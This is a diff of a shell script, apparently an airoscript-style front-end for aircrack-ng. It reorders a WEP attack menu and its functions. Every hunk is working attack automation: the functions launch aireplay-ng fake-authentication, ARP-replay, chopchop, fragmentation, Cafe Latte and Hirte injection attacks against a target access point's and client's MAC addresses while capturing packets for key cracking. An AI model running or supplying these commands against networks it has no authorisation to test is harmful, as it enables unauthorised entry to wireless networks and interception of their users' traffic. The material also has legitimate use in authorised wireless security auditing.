@@ -23,26 +23,24 @@ wep_attacks_menu(){
                while true; do $clear  
                 mkmenu "Wep Attacks" "Attacks not using a client" "Attacks using a client " "ARP inject from xor (PSK) " "Return to main menu "
                 case $choice in
-                    1  ) { mkmenu "Attacks not using a client" "Fake auth => Automatic  " "Fake auth => Interactive" "Fragmentation attack " "Chopchop attack " "Cafe Latte attack " "Hirte attack " "Return to main menu"
+                    1  ) { mkmenu "Attacks not using a client" "Fake auth => Automatic  " "Fake auth => Interactive" "Fragmentation attack " "Chopchop attack " "Return to main menu"
                     case $choice in
                         1  ) wep_attacks fakeauto ; break ;;
                         2  ) wep_attacks fakeinteractive;$clear ; break ;;
                         3  ) wep_attacks fragmentation NC ;$clear; break ;;
                         4  ) wep_attacks chopchop ;$clear; break ;;
-                        5  ) wep_attacks caffelate ;$clear; break ;;
-                        6  ) wep_attacks hirte ;$clear; break ;;
-                        7  ) $clear; break ;;
+                        5  ) $clear; break ;;
                         *  ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
                     esac
                      } ; break;;
                       2  ) {
-                mkmenu "Attacks using a client" "ARP replay => Automatic"	"ARP replay => Interactive"	"Fragmentation attack "	"Frag. attack on client "	"Chopchop attack" "Return to main menu"
+                mkmenu "Attacks using a client" "ARP replay => Automatic"	"ARP replay => Interactive"	"Fragmentation attack"	"Chopchop attack" "Cafe latte" "Return to main menu"
                 case $choice in
                     1  ) wep_attacks arpreplay_auto ;$clear; break ;;
                     2  ) wep_attacks arpreplay_interactive ;$clear; break ;;
-                    3  ) wep_attacks fragmentation -5 ;$clear; break ;;
-                    4  ) wep_attacks fragmentation -7 ;$clear ; break ;;  
-                    5  ) wep_attacks chopchopclient;$clear ; break ;;
+                    3  ) wep_attacks fragmentation -7 ;$clear ; break ;;  
+                    4  ) wep_attacks chopchopclient;$clear ; break ;;
+                    5  ) wep_attacks caffelate ;$clear; break ;;
                     6  ) $clear; break ;;
                     *  ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
                 esac
@@ -88,18 +86,9 @@ wep_attacks_fakeinteractive(){
     capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
 }
 
-wep_attacks_chopchop(){
-    $clear && hardclean  replay_dec-*.xor
-    capture &  fakeauth3 & 
-    execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & injectmenu chopchop
-}
 
 wep_attacks_caffelate(){
     capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 
-}
-
-wep_attacks_hirte(){
-    capture & execute "Hirte Attack on: $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 
 }
 
 wep_attacks_arpreplay_auto(){
@@ -130,9 +119,15 @@ wep_attacks_fragmentation(){
         execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h\
             $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture & choosefake &  injectmenu frag
     else
-        execute "Fragmentation attack" $AIREPLAY $1 -b $Host_MAC -h $Client_MAC\
+        execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
             -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu frag
     fi
+}
+
+wep_attacks_chopchop(){
+    $clear && hardclean  replay_dec-*.xor
+    capture &  fakeauth3 & 
+    execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & injectmenu chopchop
 }
 
 wep_attacks_chopchopclient(){
